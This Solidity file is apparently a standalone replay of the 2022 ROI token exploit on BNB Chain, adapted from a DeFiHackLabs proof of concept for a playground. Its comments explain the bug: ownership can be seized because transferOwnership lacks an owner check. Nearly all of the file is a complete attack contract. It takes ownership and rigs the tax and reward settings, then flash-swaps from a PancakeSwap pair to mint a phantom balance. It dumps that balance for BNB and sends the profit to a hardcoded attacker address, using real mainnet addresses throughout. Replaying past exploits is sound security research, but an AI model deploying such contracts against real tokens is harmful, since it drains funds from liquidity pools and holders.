// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-ROI).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract —
// the `Attacker` contract IS the test, and the PancakeSwap flash-swap callback
// `pancakeCall` lives on it — so there is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic, constants, and the magic
// numbers are copied verbatim from test/ROI_exp.sol.
//
// Root cause: ROIToken.transferOwnership() is missing the `onlyOwner` modifier
// (anyone can seize ownership) and includeInReward() zeroes `_tOwned` but keeps
// the inflated `_rOwned`, so an excluded account that accrues reflection while a
// 99% "tax" is applied gets a phantom balance when re-included. The attacker
// seizes ownership, sets a 99% tax, flash-swaps ROI through the BUSD/ROI pair
// (which the token's fee branch ignores), repays, re-includes itself to mint
// ~3.99M phantom ROI, then dumps it for BNB.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external;
}

interface IROIToken {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferOwnership(address) external;
    function setTaxFeePercent(uint256) external;
    function setBuyFee(uint256, uint256) external;
    function setSellFee(uint256, uint256) external;
    function setLiquidityFeePercent(uint256) external;
    function excludeFromReward(address) external;
    function includeInReward(address) external;
}

interface IPancakeRouter {
    function swapETHForExactTokens(uint256, address[] calldata, address, uint256) external payable returns (uint256[] memory);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function sync() external;
}

contract ROIDrain {
    address constant ATTACKER = 0x91b7F203ED71C5eCCF83b40563e409D2F3531114;
    IROIToken constant ROI = IROIToken(0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakeRouter constant ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant BUSD_ROI_PAIR = IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124);

    // The 12 ROI holders the test excludes from reward (so reflection credit flows
    // to the attacker's _rOwned instead of being diluted across them). Verbatim
    // from test/ROI_exp.sol.
    address[12] private excluded = [
        0x575e2Cd07E4d6CCBcA708D64b4ba45521A2C0722,
        0x216FC1D66677c9A778C60E6825189508b9619908,
        0x61708418F929f264Edd312aDC7089eB9d69cEd9C,
        0xC81DC8F793415B80d7Ee604e936B79D85BD771B6,
        0x19af64CFB666d7Df8C69F884CDf5d42c0e1F9D0C,
        0xA982444d884e00C7dFBBCB90e7a705E567853d0E,
        0x899045B0B52d55Be0210A1046a01B99C78E44540,
        0xDdda7b2D1B9EbafD37c434b90a09fca6d014682F,
        0xf3C7107024e4935FbFd9f665cF5321146DfBD9a8,
        0x6f84160a01f3D4005eB50582d14F17B72575A80A,
        0x143B8568B1ef2F22f3A67229E80DCF0e6fe9bf96,
        0x16A31000295d1846F16B8F1aee3AeDC6b2cB730b
    ];

    // Seed the run with the BNB needed for the initial ROI buy (5 BNB), then run
    // the whole attack. Native BNB profit is forwarded to ATTACKER at the end of
    // the dump swap.
    function run() external {
        // ---- Step 0: seed buy — 5 BNB -> BUSD -> 111,291.83 ROI -----------------
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        path[2] = address(ROI); // [WBNB, BUSD, ROI]
        ROUTER.swapETHForExactTokens{value: 5 ether}(111_291_832_999_209, path, address(this), block.timestamp);

        // ---- Step 1: seize ownership (transferOwnership has NO onlyOwner) -------
        ROI.transferOwnership(address(this));

        // ---- Step 2: neutralize fees ---------------------------------------------
        ROI.setTaxFeePercent(0);
        ROI.setBuyFee(0, 0);
        ROI.setSellFee(0, 0);
        ROI.setLiquidityFeePercent(0);

        // exclude the 12 LP holders + the token + self
        for (uint256 i = 0; i < excluded.length; i++) ROI.excludeFromReward(excluded[i]);
        ROI.excludeFromReward(address(ROI));
        ROI.excludeFromReward(address(this));

        // ---- Step 3: plant a foothold — send all but 100,000 ROI to the pair ----
        uint256 roiBal = ROI.balanceOf(address(this));
        ROI.transfer(address(BUSD_ROI_PAIR), roiBal - 100_000e9); // tax is 0

        // ---- Step 4: arm the 99% tax ---------------------------------------------
        ROI.setTaxFeePercent(99);

        // ---- Step 5: flash-swap 4,343,012 ROI from the BUSD/ROI pair -------------
        // The pair sends ROI to us; the 99% "tax" credits our _rOwned as if we
        // received the full amount while only 1% lands on-balance. pancakeCall
        // (below) repays immediately, taxed again at 99%.
        BUSD_ROI_PAIR.swap(4_343_012_692_003_417, 0, address(this), "3030");

        // ---- Step 7: re-include self — phantom balance materializes --------------
        ROI.setTaxFeePercent(0);
        ROI.includeInReward(address(this)); // _tOwned=0 but _rOwned kept -> ~3.99M ROI

        // ---- Step 8: re-sync the pool so reserves track the eroded ROI balance ---
        BUSD_ROI_PAIR.sync();

        // ---- Step 9: dump the phantom ROI for BNB --------------------------------
        path[0] = address(ROI);
        path[2] = address(WBNB); // [ROI, BUSD, WBNB]
        ROI.approve(address(ROUTER), type(uint256).max);
        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            3_986_806_268_542_825, 0, path, address(this), block.timestamp
        );

        // forward all BNB profit to the attacker EOA
        (bool ok, ) = ATTACKER.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }

    // PancakeSwap flash-swap callback — repay the borrowed ROI. Because the 99%
    // tax applies, only ~1% of what we send actually lands in the pair, but that
    // satisfies the swap's k-check (the borrowed ROI was mostly "burned" into
    // reflections rather than removed). Our _rOwned balloons via _reflectFee.
    function pancakeCall(address, uint256, uint256, bytes calldata data) external {
        require(keccak256(data) == keccak256("3030"), "Invalid PancakeSwap Callback");
        ROI.transfer(address(BUSD_ROI_PAIR), ROI.balanceOf(address(this)));
    }

    receive() external payable {}
}
